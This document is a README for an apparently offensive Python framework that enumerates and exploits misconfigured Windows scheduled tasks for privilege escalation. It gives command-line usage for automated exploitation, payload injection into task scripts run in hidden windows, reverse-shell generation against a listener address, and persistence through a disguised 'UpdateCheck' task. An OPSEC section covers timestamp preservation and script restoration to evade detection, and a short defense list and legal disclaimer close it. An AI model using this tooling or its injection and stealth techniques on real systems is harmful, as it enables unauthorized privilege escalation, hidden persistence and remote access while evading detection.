# Scheduled Task Exploitation Framework

A modular Python framework for enumerating and exploiting Windows scheduled task misconfigurations for privilege escalation.

## ⚠️ Legal Disclaimer

This tool is intended for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Overview

Windows scheduled tasks can be a significant privilege escalation vector when misconfigured. This framework identifies and exploits common misconfigurations:

- **Writable Task Scripts**: Tasks running scripts that low-privilege users can modify
- **Writable Executable Directories**: Task executables in directories where DLLs can be planted
- **PATH Hijacking**: Opportunities to plant DLLs in writable PATH directories

## Features

- Enumerate all scheduled tasks on a system
- Identify tasks running as SYSTEM/Administrator
- Detect writable scripts and executables
- Inject payloads while preserving original functionality
- Automatic backup and restoration (OPSEC)
- Timestamp preservation for stealth
- Multiple report formats (JSON, TXT)
- Persistence creation via new scheduled tasks

## Directory Structure

```
scheduled_task_framework/
├── __init__.py              # Package initialization
├── task_exploit.py          # Main CLI entry point
├── README.md                # This file
│
├── core/                    # Core functionality
│   ├── __init__.py
│   ├── base.py              # Abstract base class
│   ├── enumerator.py        # Task enumeration
│   └── analyzer.py          # Vulnerability analysis
│
├── exploits/                # Exploitation modules
│   ├── __init__.py
│   ├── script_injector.py   # Script payload injection
│   └── task_exploiter.py    # Exploitation orchestration
│
├── utils/                   # Utility functions
│   ├── __init__.py
│   ├── helpers.py           # Helper utilities
│   └── reporter.py          # Report generation
│
└── output/                  # Backups, logs, reports
```

## Installation

```bash
# Clone or copy the framework
git clone <repo> scheduled_task_framework
cd scheduled_task_framework

# No additional dependencies required (uses standard library)
```

## Quick Start

### Enumerate Tasks

```bash
python task_exploit.py --enumerate
```

### Analyze for Vulnerabilities

```bash
python task_exploit.py --analyze
```

### Exploit a Specific Task

```bash
python task_exploit.py --exploit --task "BackupTask" --script "C:\Scripts\backup.bat" --payload payload.exe
```

### Fully Automated Exploitation

```bash
python task_exploit.py --auto --payload payload.exe
```

### Generate Reverse Shell Scripts

```bash
python task_exploit.py --generate-revshell --lhost 192.168.1.100 --lport 4444
```

### Create Persistence

```bash
python task_exploit.py --persist --task-name "UpdateCheck" --payload payload.exe --schedule ONLOGON
```

## Module Usage

### As a Library

```python
from rt_scheduled_task_framework import (
    TaskEnumerator,
    TaskAnalyzer,
    ScriptInjector,
    TaskExploiter
)

# Enumerate tasks
enumerator = TaskEnumerator()
tasks = enumerator.enumerate_all_tasks()
privileged = enumerator.get_privileged_tasks()

# Analyze for vulnerabilities
analyzer = TaskAnalyzer()
opportunities = analyzer.analyze_all_tasks()
analyzer.display_findings()

# Inject payload into script
injector = ScriptInjector()
success, backup = injector.inject_payload(
    script_path="C:\\Scripts\\backup.bat",
    payload_path="C:\\payload.exe"
)

# Full exploitation workflow
exploiter = TaskExploiter()
exploiter.exploit_writable_script(
    task_name="BackupTask",
    script_path="C:\\Scripts\\backup.bat",
    payload_path="C:\\payload.exe"
)
```

## Exploitation Workflow

1. **Enumeration**: Discover all scheduled tasks
2. **Analysis**: Identify tasks running as privileged users with writable scripts
3. **Backup**: Create timestamped backup of original script
4. **Injection**: Inject payload while preserving original functionality
5. **Trigger**: Manually trigger task or wait for scheduled run
6. **Restore**: Restore original script (optional, for OPSEC)

## Script Injection Templates

The framework supports multiple script types:

| Type | Extension | Injection Method |
|------|-----------|------------------|
| Batch | .bat, .cmd | `start /B` hidden process |
| PowerShell | .ps1 | `Start-Process -WindowStyle Hidden` |
| VBScript | .vbs | `WScript.Shell.Run(..., 0, False)` |
| JScript | .js | `WScript.Shell.Run(..., 0, false)` |

## OPSEC Considerations

- **Timestamp Preservation**: File timestamps are preserved to avoid detection
- **Automatic Restoration**: Original scripts are restored after exploitation
- **Backup Creation**: All modifications are backed up for recovery
- **Hidden Execution**: Payloads are executed in hidden windows

## Report Generation

Generate detailed reports in multiple formats:

```bash
# JSON report
python task_exploit.py --analyze --report findings --report-format json

# Text report
python task_exploit.py --analyze --report findings --report-format txt

# Both formats
python task_exploit.py --analyze --report findings --report-format both
```

## Defense Recommendations

1. **Restrict Script Permissions**: Store scheduled task scripts in protected directories
2. **Use Signed Scripts**: Implement PowerShell execution policies requiring signed scripts
3. **Principle of Least Privilege**: Avoid running tasks as SYSTEM when possible
4. **Monitor Script Changes**: Alert on modifications to scheduled task scripts
5. **Audit Scheduled Tasks**: Regularly review scheduled task configurations
6. **Application Whitelisting**: Restrict what executables can run

## References

- [MITRE ATT&CK - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
- [Windows Task Scheduler](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
- [PayloadsAllTheThings - Scheduled Tasks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## License

For educational and authorized testing purposes only.